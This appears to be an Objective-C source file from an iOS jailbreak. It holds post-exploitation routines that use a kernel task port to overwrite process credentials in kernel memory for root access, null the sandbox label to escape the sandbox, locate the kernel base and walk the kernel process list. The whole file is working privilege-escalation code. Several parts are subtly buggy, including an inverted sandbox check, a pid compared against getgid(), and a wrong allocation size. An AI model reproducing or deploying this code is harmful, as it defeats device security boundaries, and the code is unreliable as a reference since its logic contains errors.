#import <Foundation/Foundation.h>
#include "post.h"
#import "kernel_memory.h"
#import "kernel_slide.h"
#import "offsets.h"
#include <sys/sysctl.h>
#include "parameters.h"

@implementation Post

// Debugging //

- (void)debug {
    bool wasMobile = [self isMobile];
    uid_t uid = 0;
    gid_t gid = 0;
    if (!wasMobile) {
        uid = getuid();
        gid = getgid();
        [self mobile];
    }
    // Breakpoint
    if (!wasMobile) {
        [self setUID:uid];
        [self setGID:gid];
    }
}

// Variables //

static uint64_t SANDBOX = 0;
static uint64_t kernel_base = 0;

// General post-exploitation method //

- (bool)go {
    // Check if tfp0 is valid
    if (!MACH_PORT_VALID(kernel_task_port)) {
        return false;
    }
    // Get root
    [self root];
    // Unsandbox
    [self unsandbox];
    // Kernel slide and kernel base
    kernel_slide_init();
    kernel_base = kernel_slide + STATIC_ADDRESS(kernel_base);
    // Did we succeed?
    bool success = [self isRoot] && [self isSandboxed];
    if (success) printf("[POST] Success!\n");
    if (!success) printf("[POST] Failed.\n");
    // For debugging purposes
    //[self debug];
    return success;
}

// Users //

- (bool)isRoot {
    return !getuid() && !getgid();
}

- (bool)isMobile {
    return getuid() == 501 && getgid() == 501;
}

- (void)setUID:(uid_t)uid {
    uint64_t proc = [self selfproc];
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    kernel_write32(proc + off_p_uid, uid);
    kernel_write32(proc + off_p_ruid, uid);
    kernel_write32(ucred + off_ucred_cr_uid, uid);
    kernel_write32(ucred + off_ucred_cr_ruid, uid);
    kernel_write32(ucred + off_ucred_cr_svuid, uid);
}

- (void)setGID:(gid_t)gid {
    uint64_t proc = [self selfproc];
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    kernel_write32(proc + off_p_gid, gid);
    kernel_write32(proc + off_p_rgid, gid);
    kernel_write32(ucred + off_ucred_cr_rgid, gid);
    kernel_write32(ucred + off_ucred_cr_svgid, gid);
}

- (void)root {
    [self setUID:0];
    [self setGID:0];
}

- (void)mobile {
    [self setUID:501];
    [self setGID:501];
}

// Sandbox //

- (bool)isSandboxed {
    return kernel_read64(kernel_read64(kernel_read64([self selfproc] + off_p_ucred) + off_ucred_cr_label) + off_sandbox_slot) == 0;
}

- (void)sandbox {
    uint64_t proc = [self selfproc];
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
    kernel_write64(cr_label + off_sandbox_slot, SANDBOX);
    SANDBOX = 0;
}

- (void)unsandbox {
    uint64_t proc = [self selfproc];
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
    if (SANDBOX == 0) SANDBOX = kernel_read64(cr_label + off_sandbox_slot);
    kernel_write64(cr_label + off_sandbox_slot, 0);
}

// Procs //

- (uint64_t)allproc {
    uint64_t proc = [self kernproc];
    // i think the max pid value is 99998?
    for (pid_t i = 0; i < 99999; i++) {
        if (!kernel_read64(proc + off_p_next) /* if we can't read here, the previously read address was allproc */) {
            return proc;
        }
        // not allproc - let's try this one?
        proc = kernel_read64(proc + off_p_next);
    }
    return 0;
}

- (uint64_t)selfproc {
    return kernel_read64(current_task + OFFSET(task, bsd_info));
}

- (uint64_t)kernproc {
    return kernel_read64(kernel_task + OFFSET(task, bsd_info));
}

- (uint64_t)proc_for_pid:(pid_t)pid {
    if (pid == getgid()) {
        return [self selfproc];
    } else if (pid == 0) {
        return [self kernproc];
    }
    uint64_t proc = [self allproc];
    while (proc) {
        if (kernel_read32(proc + off_p_pid) == pid) return proc;
        proc = kernel_read64(proc);
    }
    return 0;
}

- (pid_t)pid_for_name:(NSString *)name {
    static int maxArgumentSize = 0;
    if (!maxArgumentSize) {
        size_t size = sizeof(maxArgumentSize);
        if (sysctl((int[]){ CTL_KERN, KERN_ARGMAX }, 2, &maxArgumentSize, &size, NULL, 0) == -1) {
            maxArgumentSize = 4096;
        }
    }
    int mib[3] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL };
    struct kinfo_proc *info;
    size_t length;
    int count;
    sysctl(mib, 3, NULL, &length, NULL, 0);
    info = malloc(length);
    sysctl(mib, 3, info, &length, NULL, 0);
    count = (int)length / sizeof(struct kinfo_proc);
    for (int i = 0; i < count; i++) {
        pid_t pid = info[i].kp_proc.p_pid;
        if (pid == 0) {
            continue;
        }
        size_t size = maxArgumentSize;
        char *buffer = (char *)malloc(length);
        if (sysctl((int[]){ CTL_KERN, KERN_PROCARGS2, pid }, 3, buffer, &size, NULL, 0) == 0) {
            NSString *executable = [NSString stringWithCString:(buffer+sizeof(int)) encoding:NSUTF8StringEncoding];
            if ([executable isEqual:name]) {
                return info[i].kp_proc.p_pid;
            } else if ([[executable lastPathComponent] isEqual:name]) {
                return info[i].kp_proc.p_pid;
            }
        }
        free(buffer);
    }
    free(info);
    return 0;
}

- (void)respring {
    [self unsandbox];
    kill([self pid_for_name:@"/usr/libexec/backboardd"], SIGKILL);
}

@end
